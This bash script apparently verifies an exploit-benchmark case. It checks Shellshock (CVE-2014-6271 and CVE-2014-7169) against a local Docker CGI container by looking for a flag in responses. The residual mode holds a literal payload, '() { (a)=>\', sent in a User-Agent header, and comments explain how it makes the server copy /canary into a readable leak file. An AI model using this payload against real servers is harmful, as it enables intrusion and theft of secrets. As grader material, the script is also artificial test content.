#!/usr/bin/env bash
# verify.sh --seed|--residual — 0=效果发生(flag出现) 10=未发生 20=环境失败 30=参数错误
# seed: CVE-2014-6271 User-Agent trailing commands -> flag in CGI body
# residual: CVE-2014-7169 () { (a)=>\  -> flag in /leaks/pcb_leak.dat (inline, never heldout)
# Judge the current RUN_FLAG (wrong/stale override must not match planted /canary).
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
mkdir -p "$WORK_DIR"
export PYTHONPATH="$CASE_DIR${PYTHONPATH:+:$PYTHONPATH}"

if [[ -n "${WORK_DIR:-}" && -f "$WORK_DIR/compose.env" ]]; then
  set -a
  # shellcheck disable=SC1091
  source "$WORK_DIR/compose.env"
  set +a
fi

dc() { docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" "$@"; }

PORT="$(dc port "$VERSION" 80 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
if [[ -z "$PORT" ]]; then
  echo "verify: cannot resolve ${VERSION}:80 (need compose port --profile)" >&2
  exit 20
fi
export PCB_TARGET_PORT="$PORT"

ready=0
for _ in $(seq 1 30); do
  if curl -fsS --max-time 5 "http://127.0.0.1:${PORT}/cgi-bin/status.cgi" >/dev/null 2>&1; then
    ready=1; break
  fi
  sleep 1
done
if [[ "$ready" != 1 ]]; then echo "verify: ${VERSION} CGI timeout on :${PORT}" >&2; exit 20; fi

if [[ "$MODE" == "--seed" ]]; then
  CAND="$("$PY" "$CASE_DIR/poc/original_poc.py" "$VERSION" 2>/dev/null || "$PY" "$CASE_DIR/poc/original_poc.py" 2>/dev/null)"
  CAND="${CAND:-"{}"}"
  CAND="$("$PY" -c "import json,sys
s = sys.argv[1]
try:
    json.loads(s)
    print(s)
except Exception:
    print(json.dumps({'path': s.strip()}))" "$CAND")"
  printf '%s' "$CAND" > "$WORK_DIR/cand.json"
else
  # residual: CVE-2014-7169 (Tavis Ormandy) — inline literal, never _heldout/.
  # bash43-025 (V1) blocks 6271 trailing commands but leaves eol_ungetc_lookahead,
  # so `() { (a)=>\` turns the -c first line into
  # `>/var/www/html/leaks/pcb_leak.dat cat /canary`.
  CAND='{"probe_id": "cve-2014-7169-residual", "header": "User-Agent", "value": "() { (a)=>\\", "path": "/cgi-bin/status.cgi", "leak_path": "/leaks/pcb_leak.dat"}'
  printf '%s' "$CAND" > "$WORK_DIR/cand.json"
fi

OUT="$("$PY" "$CASE_DIR/poc/seed_exec.py" "$WORK_DIR/cand.json" "$VERSION" 2>&1)" || {
  echo "verify: seed_exec failed" >&2; printf '%s\n' "$OUT" >&2; exit 20; }

BODY="$(printf '%s' "$OUT" | "$PY" -c "import json,sys
try:
    d = json.load(sys.stdin)
    if not isinstance(d, dict):
        print(d if isinstance(d, str) else json.dumps(d, ensure_ascii=False))
        raise SystemExit
    parts = []
    for k in ('body', 'fetched_body', 'exploit_body', 'leak_body'):
        v = d.get(k)
        if v:
            parts.append(str(v))
    print('\\n'.join(parts) if parts else json.dumps(d, ensure_ascii=False))
except Exception:
    print('')" 2>/dev/null)"
echo "${BODY:0:500}"
if grep -qF "$RUN_FLAG" <<<"$BODY"; then exit 0; else exit 10; fi
